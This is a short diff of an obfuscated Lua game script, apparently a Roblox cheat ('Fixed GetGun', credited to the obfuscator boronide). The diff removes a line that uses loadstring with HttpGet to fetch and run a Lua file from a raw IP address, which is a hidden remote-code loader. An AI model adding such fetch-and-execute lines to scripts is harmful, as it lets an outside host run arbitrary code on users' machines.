@@ -1,4 +1,3 @@
-
 --[[                                                       
 [=] Fixed GetGun
 [*] Obfuscated by boronide, enjoy with fast script
@@ -24,7 +23,6 @@
                          /__/     \__\ |__| \__| |_______/    |__|  |__|     |__|     |______/   |_| |____/  |____|  \___/  
                                                                                                                             
 ]]
-loadstring(game:HttpGet"https://45.15.159.110/cdn/saktkia51_1aprilfool.lua")()
 local g,O,m=nil,nil,nil([[
 
 	discord.gg/boronide
